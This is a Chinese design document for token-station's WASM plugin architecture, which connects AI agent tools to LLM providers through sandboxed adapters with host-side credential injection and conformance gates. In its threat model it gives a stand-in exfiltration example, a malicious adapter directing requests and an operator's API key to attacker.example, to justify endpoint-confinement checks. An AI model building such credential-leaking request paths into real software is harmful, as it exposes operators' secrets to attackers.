# 双端 adapter 插件架构（Agent 接入 / Model Provider）

> 场景：token-station 本质是连接「主流 AI Agent 工具」与「AI LLM 模型/供应商」的中间平台。北向 Agent 工具协议和南向模型 provider API 都会高频变化，必须都能动态加载插件，而不是每适配一个工具或模型就整体重编译。本文是 [代码仓库规划](./代码仓库规划.md) 的实现细化。
>
> 整理日期 2026-07-09。核心拍板：**稳定 Canonical IR 在主程序内；北向 Agent 接入差异和南向 Provider 差异都放 WASM 插件；conformance-tests 是插件准入机制，不是线上业务逻辑。**

---

## 一、目标与非目标

### 目标

1. **双端动态加载**：新增 Agent 工具接入或 LLM provider/model adapter 不需要重新编译平台、企业网关或社区客户端。
2. **可贡献**：第三方可以在开源仓按 SDK 开发 `agent-adapter` 或 `provider-adapter`，并用公共 conformance 套件自测。
3. **安全隔离**：插件默认拿不到密钥、文件系统和任意网络能力；主程序负责认证、HTTP、计量、日志、策略和审计。
4. **双端复用**：社区版本地客户端、企业部署网关、平台 SaaS 使用同一套 adapter ABI、runtime 与 conformance 标准。
5. **可回滚**：插件支持按版本安装、启用、灰度、禁用和回滚。

### 非目标

- 不把 billing、license、租户隔离、账号会话、secret storage 做成插件。
- 不允许第三方插件直接处理平台账本或绕过路由策略。
- 不把 conformance-tests 当作线上可执行插件；它只在开发、安装、升级和 CI 中运行。
- 不把原生 `.so` / `.dylib` 作为默认生态接口；原生动态库只可作为内部可信优化路径。

---

## 二、两类插件

| 插件类型 | 方向 | 解决的问题 | 示例 |
|----------|------|------------|------|
| `agent-adapter` | 北向入口 | 对接 AI Agent 工具、SDK、IDE 插件、CLI 的协议 shape、流式格式、hint header、模型名约定 | OpenAI-compatible client、Anthropic Messages client、Claude Code、Codex CLI、Continue、Cline、Cursor |
| `provider-adapter` | 南向出口 | 对接 LLM provider/model API 的请求构造、认证声明、响应解析、错误映射、usage 口径 | OpenAI-compatible provider、Anthropic、Gemini、Bedrock、Azure OpenAI、本地 Ollama/vLLM |

关键判断：**Agent 工具和 Provider 不是同一个维度，不能混成一个 adapter。**

- Agent 工具关心「用户/工具怎么请求 token-station」。
- Provider 关心「token-station 怎么请求模型供应商」。
- 路由、预算、fallback、计费、审计在中间 host 内执行，插件只负责边界协议转换。

---

## 三、核心模型：稳定 Canonical IR + 双端 Adapter

主程序只认识稳定 Canonical IR：

| IR 对象 | 说明 |
|---------|------|
| `AgentRequestEnvelope` | 北向请求外壳：原始协议、agent/tool 标识、headers 摘要、认证主体、hint 元数据 |
| `ChatRequest` | 标准化后的聊天请求，含 messages、tools、response_format、sampling 参数 |
| `AgentHint` | Agent/IDE/CLI 提供的步骤类型、任务类型、偏好、能力声明；只作为路由输入，不直接决定结果 |
| `ChatResponse` | 非流式响应 |
| `StreamEvent` | 流式事件，覆盖 delta、tool_call_delta、usage、done、error |
| `ToolCall` | 工具调用结构 |
| `ModelCapability` | 模型能力：tool、vision、json_schema、context_window、supported_parameters |
| `ErrorEnvelope` | 统一错误码、HTTP status、provider/agent 原始错误摘要 |
| `Usage` | input/output/cache/read/reasoning 等 token 口径 |
| `HttpRequestDescriptor` | Provider 插件生成的上游请求描述，不含密钥明文；`auth: Auth` 声明**用哪个凭证槽位、以何种方言呈现**（Bearer / 凭证头 / OAuth），值由 host 注入 |
| `HttpResponseParts` | host 发起 HTTP 后交给 Provider 插件解析的响应头、状态码、body/stream chunk |
| `ProviderConfig` | host 交给 Provider 插件的上游配置：provider 名、`base_url`、凭证槽位引用（`Option<SecretRef>`，本地 Ollama 为 `None`）、模型声明。`base_url` 是 `ProviderEndpoint`，构造与反序列化都拒绝 userinfo 和 query——它是唯一由 host 流入沙箱的字段，而运维习惯把 key 写在那里 |

数据流：

```text
Cursor / Claude Code / Codex CLI / Continue / Cline / OpenAI SDK
        ↓
agent-adapter plugin
        ↓
Canonical IR + AgentHint
        ↓
router-core / policy / billing / logging / audit
        ↓
provider-adapter plugin
        ↓
HttpRequestDescriptor
        ↓
host 注入认证并发起 HTTP
        ↓
provider-adapter plugin 解析响应
        ↓
Canonical IR response / stream events
        ↓
agent-adapter plugin 渲染为入口协议响应
```

关键约束：**插件只做协议适配，不拥有策略权**。候选集选择、预算、限流、计费、fallback、审计都在 host 内执行。

---

## 四、插件形态

默认形态：**WASM Component + WASI**。

理由：

- ABI 可版本化；
- 可沙箱限制 CPU、内存、执行时间；
- host functions 可精确暴露；
- 同一插件可运行在社区客户端、私有部署网关和平台 SaaS；
- 第三方贡献不需要链接主程序内部 crate。

插件包结构：

```text
adapter-openai-client/
  manifest.json
  adapter.wasm
  fixtures/
    agent.normalize.chat.input.json
    agent.normalize.chat.expected.json
    agent.hint.step-header.{input,expected}.json
    agent.render.tool-call.{input,expected}.json
    agent.stream.delta.{input,expected}.json
    agent.error.rate-limit.{input,expected}.json
  README.md
  signature.sig

adapter-openai-provider/
  manifest.json
  adapter.wasm
  fixtures/
    provider.capabilities.declared.{input,expected}.json
    provider.request.chat.{input,expected}.json
    provider.response.tool-call.{input,expected}.json
    provider.stream.tool-call.{input,expected}.json
    provider.error.rate-limit.{input,expected}.json
    provider.error.rejected-credential.{input,expected}.json
  README.md
  signature.sig
```

fixture 文件名是 `<kind>.<family>.<case>.{input,expected}.json`：

- `kind` ∈ {`agent`, `provider`}，与 suite 对应；双角色包共用一个 `fixtures/` 目录时，另一个 role 的文件被**跳过**而不是报错；
- `family` 决定输入喂给哪个 ABI 函数（provider：`capabilities` / `request` / `response` / `stream` / `error`；agent：`normalize` / `hint` / `render` / `stream` / `error`）；
- `case` 必填，哪怕这个 family 只有一个用例——否则加第二个用例就要改第一个的名字，而 fixture 名会出现在比包本身活得更久的 conformance 报告里。

**每个 family 至少一个用例**，否则 `Check::Coverage` 拒包：不这么要求的话，一个插件只要什么都不提交就能通过。此外 provider 包**必须**有一个 401/403 用例，否则「拒绝的凭证不得可重试」那道门根本不会跑（见 §七）。

fixture 的输入是 Canonical IR，不是 provider 的原始 wire format。一个能装凭证的 fixture 就是绕过类型系统的通道，所以 `HeaderDigest` / `SafeHeaders` / `ProviderEndpoint` 的反序列化侧校验在这里同样生效。

`agent-adapter` manifest 示例：

```json
{
  "name": "adapter-openai-client",
  "version": "1.0.0",
  "api_version": "agent-adapter-v1",
  "kind": "agent-adapter",
  "agent_protocols": ["openai-chat-completions", "openai-responses"],
  "agent_tools": ["generic-openai-sdk", "cursor", "continue"],
  "capabilities": ["chat", "stream", "tool_call", "json_schema", "agent_hint"],
  "permissions": {
    "network": false,
    "filesystem": false,
    "secrets": []
  },
  "conformance": {
    "required_suite": "agent-protocol-v1",
    "fixtures": "fixtures/"
  }
}
```

`provider-adapter` manifest 示例：

```json
{
  "name": "adapter-openai-provider",
  "version": "1.2.0",
  "api_version": "provider-adapter-v1",
  "kind": "provider-adapter",
  "providers": ["openai-compatible"],
  "capabilities": ["chat", "stream", "tool_call", "json_schema"],
  "permissions": {
    "network": false,
    "filesystem": false,
    "secrets": ["provider_api_key"]
  },
  "conformance": {
    "required_suite": "provider-protocol-v1",
    "fixtures": "fixtures/"
  }
}
```

一个插件**包**（目录 / release artifact）可以同时提供两个 role，但**一个 `manifest.json` 恒为单 role**：双角色包出两份 manifest、两个 `.wasm`，各自独立走 conformance。

这不是权宜之计，而是「避免一个入口适配器隐式获得 provider 权限」唯一靠类型系统兑现的方式。`provider-adapter-v1` import 了 `host`（拿得到 `sign`），`agent-adapter-v1` 什么都不 import。若把两个 role 合进一个 world，整个 component 就必须 import `host`，于是 agent 侧的导出函数也能调 `host.sign`——这条约束会从「ABI 边界保证」降级成「运行时约定」。拆开加载不是为了满足这句话，拆开**就是**这句话。

推论：`kind` 字段恒为单值，`AdapterManifest::validate()` 因此可以 `match kind` 做整表校验（agent 不得声明 `providers`、provider 不得声明 `agent_hint` capability），无需按 role 拆分 `permissions` / `capabilities` / `conformance`。

---

## 五、Adapter ABI 草案

公共接口：

```text
adapter-common-v1
  metadata() -> AdapterMetadata
  healthcheck() -> AdapterHealth
```

北向 `agent-adapter-v1`：

```text
agent-adapter-v1
  metadata() -> AdapterMetadata
  supported_agent_protocols() -> list<AgentProtocolCapability>
  match_inbound(request_head) -> MatchResult
  normalize_inbound(AgentRequestEnvelope) -> ChatRequest
  extract_agent_hint(AgentRequestEnvelope) -> list<AgentHint>
  render_response(ChatResponse, AgentRenderContext) -> AgentResponseEnvelope
  render_stream_event(StreamEvent, AgentRenderContext) -> AgentStreamChunk
  map_inbound_error(ErrorEnvelope, AgentRenderContext) -> AgentResponseEnvelope
```

南向 `provider-adapter-v1`：

```text
provider-adapter-v1
  metadata() -> AdapterMetadata
  model_capabilities(ProviderConfig) -> list<ModelCapability>
  build_http_request(ChatRequest, ProviderConfig) -> HttpRequestDescriptor
  parse_response(HttpResponseParts) -> ChatResponse
  parse_stream_chunk(StreamChunk) -> list<StreamEvent>
  map_provider_error(HttpResponseParts) -> ErrorEnvelope
```

说明：

- `agent-adapter` 负责入口协议 normalize 和最终响应 render，例如 OpenAI Chat Completions / Responses API / Anthropic Messages / Agent 工具私有 header。
- `provider-adapter` 负责出站 provider 适配，例如 Canonical `ChatRequest` → Gemini HTTP 请求，再把 Gemini 响应解析回 Canonical IR。
- `AgentHint` 只能作为路由特征输入，不能让插件直接指定最终 provider/key。
- `parse_stream_chunk` 和 `render_stream_event` 都必须支持增量；插件不得缓存无限长度 body。
- `map_provider_error` 与 `map_inbound_error` 都必须映射到稳定错误目录。
- **凭证方言由 adapter 声明，明文由 host 注入**：`ProviderConfig.auth` 告诉插件这个上游有哪个凭证槽位（或没有），插件在 `HttpRequestDescriptor.auth` 里说明怎么呈现它——`Auth::Bearer`（OpenAI）、`Auth::Header{name}`（Anthropic 的 `x-api-key`、Gemini 的 `x-goog-api-key`）、`Auth::OAuth{scopes}`（平台账户上游，对应个人版 C2#2）。`Auth::Header` 的 `name` 必须落在凭证头目录内，否则 host 会把密钥写进一个下游无人脱敏的头。
- `Auth` 是闭集，无 query-param 变体：v1 范围内没有上游需要它（看起来需要的 Gemini 接受 `x-goog-api-key`），而 URL 是最容易进日志的字段。AWS SigV4 需要把 `host.sign` 的结果放进 `Authorization`，v1 的 `SafeHeaders` 不允许——这类方言留给 `-v2`。

---

## 六、密钥与网络边界

插件默认不能直接联网，也不能读取密钥明文。

Provider 侧正确模式：

```text
host            -> ProviderConfig(base_url, auth = Some("provider_api_key"))
provider plugin -> HttpRequestDescriptor(url, auth = Bearer("provider_api_key"))
host            -> ProviderConfig::authorize(descriptor)   ← url 必须落在 base_url 内
host            -> 解析槽位、注入明文（Bearer / 凭证头 / OAuth 换取的 token）
host            -> 发起 HTTP
provider plugin -> 解析响应
```

`authorize` 这一步不可省。插件同时决定「请求发去哪」和「附哪个凭证」——单看都无害，合起来就是一条外泄通道：一个恶意 provider-adapter 返回 `url = "https://attacker.example/collect"`，host 会照常把运维的 key 注进去发出去。`ProviderConfig::authorize` 先比 origin（精确相等，`api.openai.com` 不匹配 `api.openai.com.evil.example`）再比路径前缀（按 segment 边界，`/v1` 不匹配 `/v1beta`），然后才看凭证槽位对不对得上。校验实现放在 `crates/protocol`，两端 host 共用同一份语义。

Agent 侧正确模式：

```text
agent tool      -> host 认证与租户识别
agent plugin    -> 只接收脱敏后的 AgentRequestEnvelope
host            -> 执行路由、预算、计费、审计
agent plugin    -> 把 Canonical response 渲染成入口协议响应
```

需要 HMAC 或复杂签名时，host 暴露受控函数：

```text
host.sign(secret_ref, payload, algorithm) -> signature
```

**没有 `host.oauth_token`。** 它只能返回两种东西：access token（那是明文凭证，插件不该持有），或者一个 handle（IR 里没有任何类型装得下它）。两条路都不通，所以 OAuth 换取动作放在 host 的注入时刻——插件用 `Auth::OAuth{secret_ref, scopes}` 声明要哪一份授权，换来的 token 从不经过沙箱。

约束：

- 插件只拿 `secret_ref`，不拿明文。`sign` 返回的签名不是凭证，插件可以把它放进普通头或 body；放不进 `Authorization`（`SafeHeaders` 拒收凭证头）。
- host 统一做 request/response size limit、timeout、retry budget、trace_id 注入。
- 插件不能绕过计费、预算、限流，因为 HTTP 由 host 发出，入口认证也由 host 完成。
- 出站目的地由 `ProviderConfig::authorize` 收口；入站凭证由 `HeaderDigest` 脱敏；插件自己写的头由 `SafeHeaders` 拒收凭证头。三道都在构造和反序列化两侧生效。

---

## 七、Conformance 准入

`crates/conformance` 提供公共验收套件，插件在三个场景必须运行：

1. 插件开发 CI；
2. 平台/企业实例安装插件；
3. 插件版本升级或灰度前。

验收项：

| 类别 | `agent-adapter` 检查 | `provider-adapter` 检查 | 由谁执行 |
|------|----------------------|--------------------------|----------|
| ABI | `agent-adapter-v1` 兼容、必需函数存在 | `provider-adapter-v1` 兼容、必需函数存在 | runtime 加载时（component 导出了这个 world 就算过，fixture 表达不了） |
| manifest | agent_protocols/agent_tools/capability/权限声明/签名 | provider/capability/权限声明/签名 | `accepts_manifest` |
| 身份 | `metadata()` 必须等于 manifest 声明 | 同左 | `reported_identity_matches` |
| 请求转换 | Agent 原始请求 → Canonical IR + AgentHint | Canonical IR → HTTP descriptor，不含密钥明文 | `FixtureMatch` + `EndpointConfinement` |
| 响应转换 | Canonical response/stream → 入口协议响应/流式 chunk | Provider body/stream chunk → Canonical response/stream | `FixtureMatch` + `StreamIncrementality` |
| 错误映射 | 稳定错误目录 → 入口协议错误 shape | rate_limit/auth/content_policy/capability/capacity 等语义错误 | `FixtureMatch` + `AuthErrorsAreNotRetriable` |
| 安全 | 禁止网络、禁止文件、内存和执行时间限制 | 禁止网络、禁止文件、内存和执行时间限制 | **runtime 的沙箱，不是 fixture**（见下） |
| 稳定性 | 同一 fixture 输出 deterministic；未知字段不得 panic | 同左 | `Determinism` + `UnknownFieldTolerance` |
| 覆盖 | 每个 family 至少一个用例 | 同左，且必须含 401/403 用例 | `Coverage` |

三条 fixture 比对之外的门，各自防住一类 fixture 比对防不住的东西：

- **`EndpointConfinement`**：provider 插件同时决定「请求发去哪」和「附哪个凭证」。它对着**插件实际构造出的** descriptor 跑 `ProviderConfig::authorize`，而不是对着 fixture 里的期望值——一个 fixture 对得上却发去别处的插件，和一个 fixture 对不上却老实待在上游内的插件，必须在报告里区分得开。
- **`StreamIncrementality`**：socket 上来的 chunk 不是完整 SSE frame。把 fixture 的 body 重新拼起来、在**每个字符边界**切一刀、每次都用全新 parser 重放，都必须得到同一串事件。一个假设「每个 chunk 是一整帧」的插件能通过所有 fixture，然后在生产里由网络决定的切分点上悄悄丢事件。
- **`AuthErrorsAreNotRetriable`**：401/403 不得映射成可重试码。否则一把被拒的 key 会被路由在用户配置的每个 provider 上重放一遍，把一个账号问题变成几个。**这道门自带一条覆盖要求**：包里没有 401/403 用例，这道门就没跑过，于是「没跑过」本身算失败。

`安全` 那一行不在 fixture 里。禁网络、禁文件系统、内存与执行时间上限，是 runtime 构造的沙箱的性质，不是可以「问插件要一个答案」的东西。`conformance` 不假装能测它——`plugin-runtime` 负责（A1 已交付）：

- **网络**：component 若 import `wasi:sockets/*` 或 `wasi:http/*`，加载即拒（`LoadError::ForbiddenImport`），而不是给一个空实现——空实现意味着「真的断掉了吗」要在每次 wasmtime 升级时重新审计，拒收让这个问题不存在。std 编出来的 guest 会 import 其余 WASI 接口，由锁死的实现满足：无预打开目录、无环境变量、无继承 stdio。
- **内存**：每个 store 一个上限（默认 64 MiB），guest 越限分配在 guest 内失败并 trap。
- **执行时间**：每次调用一个 deadline（epoch interruption，后台 ticker 推进），死循环在 deadline 处 trap。
- 三种 trap（超时 / 越限 / panic）对调用方是同一件事：一个没有作答的 adapter，统一映射为 `internal` 的 `ErrorEnvelope`；宿主不 panic，插件句柄可继续使用。
- 以上由真实的 `wasm32-wasip2` 组件测试驱动（`plugin-runtime/tests/guests/test-provider`，一个按输入指令故意 hang / 狂分配 / panic 的 guest），不是 mock。

`conformance` 面向一对 trait（`AgentAdapter` / `ProviderAdapter`）而非 wasmtime。因此：这套门在 runtime 存在之前就能写完并被证伪；第三方插件作者可以先用原生构建在自己 CI 里跑同一套门，不必先搭 WASM 工具链；`crates/conformance` 不依赖 wasmtime。

插件安装流程：

```text
upload plugin package
  -> verify signature
  -> verify manifest
  -> select conformance suite by kind/api_version
  -> run conformance suite
  -> optional provider smoke test
  -> install disabled
  -> enable by scope (global/org/team/key)
```

未通过 conformance 的插件只能保存为草稿，不允许进入运行时 registry。

---

## 八、运行时与灰度

运行时组件：

| 组件 | 责任 |
|------|------|
| `PluginRegistry` | 记录插件包、版本、签名、kind、启用 scope |
| `PluginRuntimePool` | 加载 WASM、缓存实例、限制资源 |
| `AgentAdapterResolver` | 根据入口 path/protocol/header/tool 解析 `agent-adapter` 版本 |
| `ProviderAdapterResolver` | 根据 provider/model/capability 解析 `provider-adapter` 版本 |
| `ConformanceRunner` | 安装/升级时执行验收 |
| `PluginTelemetry` | 记录耗时、错误、panic、资源超限 |

启用策略：

- 默认按实例全局安装，但按 org/team/key 启用；
- `agent-adapter` 按 `agent_protocol` / `agent_tool` / route path 绑定；
- `provider-adapter` 按 `provider` / `model_family` 绑定；
- 支持灰度百分比；
- 支持 pin 版本；
- 支持回滚；
- 卸载前 drain 旧请求；
- 插件 panic 或超时达到阈值时自动熔断该插件版本。

---

## 九、仓库落点

开源仓 `token-station`：

```text
crates/protocol             # Canonical IR、AgentHint、基础协议类型
crates/plugin-api           # WIT / ABI / SDK / manifest schema
crates/plugin-runtime       # WASM host runtime，可被客户端与服务端复用
crates/conformance          # agent/provider fixture runner 与断言库
plugins/official/agent-openai
plugins/official/agent-anthropic
plugins/official/agent-claude-code
plugins/official/provider-openai-compatible
plugins/official/provider-anthropic
plugins/official/provider-gemini
```

闭源仓 `token-station-server`：

```text
services/plugin-registry       # 插件上传、签名校验、版本管理
services/plugin-admin          # 管理侧启用/灰度/回滚
crates/server-plugin-policy    # license、租户 scope、审计
```

实现原则：

- `plugin-api` 与 `protocol` 的 breaking change 必须走 `agent-adapter-v2` / `provider-adapter-v2`，不能原地改 ABI。
- 官方插件也走同一套 conformance，不允许使用内部私有接口绕过。
- 社区客户端可从本地目录加载插件；平台/企业版从服务端 registry 加载签名插件。

### 9.1 插件项目边界与拆仓策略

`agent-adapter` / `provider-adapter` 需要独立审计与快速迭代，但**P1-P2 不单独拆 repo**。早期更重要的是让 `Canonical IR`、ABI、SDK、runtime、conformance 和官方样板插件一起演化，避免跨仓版本漂移。

插件级审计边界：

| 审计对象 | 要求 |
|----------|------|
| 插件源码目录 | 独立 CODEOWNERS；每个插件独立 CI job |
| `manifest.json` | kind、api_version、capabilities、permissions、provider/agent binding 声明齐全 |
| fixtures | 覆盖请求转换、流式、错误映射、未知字段、权限边界 |
| conformance report | 每个 release artifact 必须附带对应 suite 的通过报告 |
| artifact | `adapter.wasm` 必须记录 sha256、SBOM、签名、公钥链 |
| 权限 | 默认无网络、无文件系统；`agent-adapter` 不得声明 secret；`provider-adapter` 只声明 secret ref |

拆仓触发条件：

- `agent-adapter-v1` / `provider-adapter-v1` 至少经过两个官方插件和一个第三方插件验证；
- `plugin-api` 与 `protocol` 的破坏性变更频率降到可控范围；
- conformance suite 可以作为独立发布物被插件仓固定依赖；
- 插件 registry 的签名、撤回、版本 pin、灰度规则已经稳定。

到达触发条件后，可以新增两个仓：

| 仓库 | 内容 | 不放什么 |
|------|------|----------|
| `token-station-adapters` | 社区/第三方 adapter 源码、fixtures、构建脚本 | 不放 `plugin-api` / `plugin-runtime` / `conformance` 权威实现 |
| `token-station-plugin-registry` | 已审核插件 manifest、checksum、签名、公钥、conformance 报告 | 不放未审核源码，不作为运行时唯一信任根 |

---

## 十、分期实施

| 阶段 | 内容 | 验收 |
|------|------|------|
| A0 | 定义 Canonical IR、AgentHint、manifest schema、`agent-adapter-v1` / `provider-adapter-v1` WIT | OpenAI chat/stream/tool fixtures 可表达入口和出口两侧 |
| A1 | 实现 `plugin-runtime` 本地加载 + 超时/内存限制 | 社区 CLI 能加载本地 WASM adapter |
| A2 | 实现双端 `conformance` runner | 官方 OpenAI agent/provider 插件通过全套 fixture |
| A3 | 把 OpenAI-compatible 入口与 provider 拆成两个官方 WASM 插件 | 主程序不重编译即可切换入口协议插件或 provider 插件版本 |
| A4 | 增加 Anthropic/Claude Code 入口样板 + Anthropic/Gemini provider 样板 | Agent 工具和模型供应商可以独立新增 |
| A5 | 服务端插件 registry + 签名校验 + 灰度启用 | 平台按 org/key 启用插件并可回滚 |
| A6 | 第三方插件开发文档与模板 | 外部贡献者可按模板新增 Agent 或 Provider adapter |

第一阶段不要同时插件化所有工具和 provider。先选 OpenAI-compatible 作为双端样板，因为它既是最常见的入口协议，也是最多 provider 兼容的出口协议，conformance fixture 容易构造。

---

## 十一、风险与约束

| 风险 | 处理 |
|------|------|
| ABI 过早冻结导致后续协议表达不够 | v1 只覆盖 chat/stream/tool/error/hint；高级能力用 extension fields，成熟后再进 v2 |
| 把 Agent 工具插件误做成策略插件 | `AgentHint` 只能成为路由特征；最终 provider/key/预算/fallback 只由 host 决定 |
| 插件性能拖慢流式 | runtime pool 预热；stream parser/render 限制分配；官方插件做基准测试 |
| 插件绕过密钥边界 | 插件不联网、不拿密钥；入口认证、HTTP 和 secret 注入只在 host |
| 第三方插件质量不稳 | conformance + 签名 + scope 灰度 + 自动熔断 |
| 平台与社区版运行结果不一致 | 两端共用 `protocol`、`plugin-api`、`conformance`，官方插件不得调用闭源私有 ABI |

---

## 十二、与既有文档的同步

| 文档 | 同步内容 | 状态 |
|------|---------|------|
| [代码仓库规划](./代码仓库规划.md) | 开源仓增加双端 `agent-adapter` / `provider-adapter` 插件落点；闭源仓增加插件安装与灰度能力 | 已同步 |
| [token-station V2 开发计划](../planning/token-station-V2开发计划.md) | P1 adapter 插件地基扩展为双端 ABI、conformance runner 与 OpenAI 双端样板插件 | 已同步 |
| [V2 阶段需求清单](../planning/V2阶段需求清单.md) | V2-P1-12 扩展为 Agent 接入和 Provider 出站双端插件地基 | 已同步 |
| [数据库设计-V1基线与V2增量](./数据库设计-V1基线与V2增量.md) | P3 插件 registry 支持 `agent-adapter` / `provider-adapter` 两类 kind 与绑定 key | 已同步 |
